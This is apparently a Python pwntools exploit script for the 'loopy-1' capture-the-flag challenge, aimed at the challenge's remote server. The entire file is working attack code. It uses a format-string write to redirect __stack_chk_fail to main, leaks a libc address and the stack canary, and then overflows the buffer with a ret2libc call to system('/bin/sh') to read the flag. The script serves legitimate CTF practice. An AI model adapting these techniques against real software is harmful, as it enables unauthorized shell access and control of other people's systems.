#!/usr/bin/env python

from pwn import *


libc = ELF('./libc.so.6')
e = ELF('./loopy-1')
#p = process('./loopy-1')
p = remote('shell.2019.nactf.com', 31732)

# gdb.attach(p, '''
# break *0x08049203
# ''')


#get addr
bin_off = 0x17eaaa
stk = e.got['__stack_chk_fail']
vuln = e.symbols['vuln']
main = e.symbols['main']
fwrite_got = e.got['fwrite']
offset = 0x1dad80

log.info('__stack_chk_fail: '+hex(stk))
log.info('vuln: '+hex(vuln))
log.info('fwrite: '+hex(fwrite_got))

#write vuln to stk check
payload = ''
payload+= fmtstr_payload(7, {stk:main})
p.sendlineafter('>', payload + 'A'*(70-len(payload)))

#leak addr
payload = ''
payload+= '%3$x'
payload+= 'A'*70
p.sendline(payload)
p.recvuntil('You typed: ')
p.recvuntil('You typed: ')
leak = int(p.recv(8), 16)
libc_base = leak - offset
log.info('leak: '+hex(leak))
log.info('libc_base: '+hex(libc_base))

#get system and binsh
system = libc_base + libc.symbols['system']
log.info('system: '+hex(system))
binsh = libc_base + libc.search('/bin/sh').next()
log.info('/bin/sh :'+hex(binsh))

#leak canary
payload = ''
payload+= '%31$x'
payload+= 'A'*70
p.recv()
p.sendline(payload)
p.recvuntil('You typed: ')
canary = int(p.recv(8), 16)
log.info('Canary: '+ hex(canary))

#bustamove
payload = ''
payload+= 'A'*64
payload+= p32(canary)
payload+= "A"*12
payload+= p32(system)
payload+= 'BBBB'
payload+= p32(binsh)
p.sendlineafter('>', payload)
p.sendline('cat flag.txt')
p.interactive()